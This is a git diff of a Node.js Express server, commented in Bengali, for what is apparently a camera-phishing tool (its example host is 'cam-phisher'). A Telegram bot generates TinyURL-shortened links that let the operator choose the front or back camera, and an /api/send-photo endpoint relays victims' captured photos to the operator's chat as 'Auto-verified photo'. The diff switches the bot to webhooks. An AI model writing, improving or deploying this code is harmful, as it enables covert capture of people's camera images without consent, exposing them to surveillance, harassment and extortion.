@@ -13,12 +13,18 @@ const BASE_URL = process.env.BASE_URL;
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
-// Initialize Telegram Bot
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// Webhook এর জন্য polling false করা হলো
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
-// Memory Storage: সেশন এবং ইউজার সেটিংস
+// Memory Storage
 const activeSessions = {}; // sessionId -> chatId
 const userSettings = {};   // chatId -> { facingMode }
+
+// --- Webhook Route (Telegram মেসেজ এখানে পাঠাবে) ---
+app.post(`/bot${BOT_TOKEN}`, (req, res) => {
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
 
 // --- Telegram Bot Commands ---
 bot.onText(/\/start/, (msg) => {
@@ -53,7 +59,6 @@ bot.on('callback_query', async (query) => {
     userSettings[chatId].facingMode = 'user';
     bot.answerCallbackQuery(query.id, { text: '✅ Front camera selected!' });
     
-    // UI আপডেট করা
     bot.editMessageReplyMarkup({
       inline_keyboard: [
         [{ text: '✅ Front Camera', callback_data: 'cam_front' }, { text: '📸 Back Camera', callback_data: 'cam_back' }],
@@ -65,7 +70,6 @@ bot.on('callback_query', async (query) => {
     userSettings[chatId].facingMode = 'environment';
     bot.answerCallbackQuery(query.id, { text: '✅ Back camera selected!' });
 
-    // UI আপডেট করা
     bot.editMessageReplyMarkup({
       inline_keyboard: [
         [{ text: '📷 Front Camera', callback_data: 'cam_front' }, { text: '✅ Back Camera', callback_data: 'cam_back' }],
@@ -76,15 +80,12 @@ bot.on('callback_query', async (query) => {
   } else if (data === 'gen_link') {
     const facing = userSettings[chatId].facingMode;
     
-    // ইউনিক সেশন আইডি তৈরি
     const sessionId = crypto.randomBytes(4).toString('hex');
-    activeSessions[sessionId] = chatId; // সেশন আইডির সাথে chatId ম্যাপ করা হলো
+    activeSessions[sessionId] = chatId;
     
-    // ফুল লিংক তৈরি
     const longLink = `${BASE_URL}/?s=${sessionId}&f=${facing}`;
     
     try {
-      // TinyURL API দিয়ে লিংক শর্ট করা
       const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
       const shortLink = await response.text();
 
@@ -102,21 +103,18 @@ app.post('/api/send-photo', async (req, res) => {
   try {
     const { imageData, sessionId } = req.body;
 
-    // চেক করা হচ্ছে সেশন আইডি ভ্যালিড কিনা
     const chatId = activeSessions[sessionId];
     if (!chatId) {
-      return res.status(403).json({ error: "" });
+      return res.status(403).json({ error: "Invalid or expired session." });
     }
 
     if (!imageData) {
       return res.status(400).json({ error: "Missing image data" });
     }
 
-    // Extract base64
     const base64Data = imageData.split(',')[1];
     const buffer = Buffer.from(base64Data, 'base64');
 
-    // Send to Telegram (শুধু নির্দিষ্ট chatId-তে যাবে)
     await bot.sendPhoto(chatId, buffer, { caption: "📸 Auto-verified photo" });
     res.json({ success: true });
 
@@ -126,6 +124,22 @@ app.post('/api/send-photo', async (req, res) => {
   }
 });
 
-app.listen(PORT, () => {
+// --- সার্ভার রান এবং Webhook সেটআপ ---
+app.listen(PORT, async () => {
   console.log(`Server running on port ${PORT}`);
+  
+  // আপনার Suga পাবলিক URL এখানে বসবে (যেমন: https://cam-phisher.suga.app)
+  const SUGA_PUBLIC_URL = process.env.SUGA_PUBLIC_URL;
+
+  if (SUGA_PUBLIC_URL) {
+    const webhookUrl = `${SUGA_PUBLIC_URL}/bot${BOT_TOKEN}`;
+    try {
+      await bot.setWebHook(webhookUrl);
+      console.log(`Webhook set successfully to: ${webhookUrl}`);
+    } catch (err) {
+      console.error("Failed to set webhook:", err.message);
+    }
+  } else {
+    console.warn("⚠️ SUGA_PUBLIC_URL is missing. Webhook could not be set. Bot won't receive messages.");
+  }
 });
